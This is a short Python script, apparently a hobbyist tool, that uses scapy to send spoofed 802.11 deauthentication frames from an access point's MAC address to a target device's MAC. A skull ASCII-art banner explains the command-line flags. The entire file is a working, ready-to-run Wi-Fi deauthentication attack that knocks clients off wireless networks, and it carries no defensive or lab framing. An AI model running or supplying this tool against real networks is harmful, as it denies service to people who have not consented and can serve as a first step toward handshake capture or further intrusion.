import scapy.all as scapy
import argparse

class PythonDeauth:
    def __init__(self):
        self.parser = argparse.ArgumentParser()
        self.parser.add_argument("-tmac", dest="target_mac", help="Target Mac")
        self.parser.add_argument("-apmac", dest="accesspoint_mac", help="Access Point Mac")
        self.parser.add_argument("-iface", dest="iface", help="Interface")
        self.parser.add_argument("-c", dest="count", type=int, help="Package quantity")
        self.args = self.parser.parse_args()

    def send_deauth_packet(self, target_mac, accesspoint_mac, iface, count):
        try:
            radio_tap = scapy.RadioTap()
            dot11 = scapy.Dot11(addr1=target_mac, addr2=accesspoint_mac, addr3=accesspoint_mac)
            dot11_deauth = scapy.Dot11Deauth()
            packet = radio_tap / dot11 / dot11_deauth
            scapy.sendp(packet, iface=iface, count=count)
            print("Process Completed")
        except Exception as e:
            print("Error Occurred:", str(e))

    def run(self):
        print("""
            ___           _,.---,---.,_
            |         ,;~'             '~;,
            |       ,;                     ;,
   Frontal  |      ;      Developed By      ; ,--- "-tmac" = TARGET MAC ADRESS
    Bone    |     ,'      Atahan Poyraz     /'
            |    ,;                        /' ;,
            |    ; ;      .           . <-'  ; |
            |__  | ;   ______       ______   ;<----- "-apmac" = ACCESS POINT MAC ADRESS
           ___   |   /~"     ~" . "~     "~\   |
           |     |  ~  ,-~~~^~, | ,~^~~~-,  ~  |
 Maxilla,  |      |   |        }:{        | <------ "-iface" = IFACE
Nasal and  |      |   l       / | \       !   |
Zygomatic  |      .~  (__,.--" .^. "--.,__)  ~.
  Bones    |      |    ----;' / | \ `;-<--------- "-c" = PACKAGE COUNT
           |__     \__.       \/^\/       .__/
              ___   V| \                 / |V 
              |      | |T~\___!___!___/~T| |
              |      | |`IIII_I_I_I_IIII'| |
     Mandible |      |  \,III I I I III,/  |
              |       \   `~~~~~~~~~~'    /
              |         \   .       .   /
              |__         \.    ^    ./
                            ^~~~^~~~^

        """)
        target_mac = self.args.target_mac
        accesspoint_mac = self.args.accesspoint_mac
        iface = self.args.iface
        count = self.args.count

        if not (target_mac and accesspoint_mac and iface and count):
            print("Missing required options. Please use -tmac, -apmac, -iface, -c")
            exit()

        self.send_deauth_packet(target_mac, accesspoint_mac, iface, count)

if __name__ == "__main__":
    PD = PythonDeauth()
    PD.run()
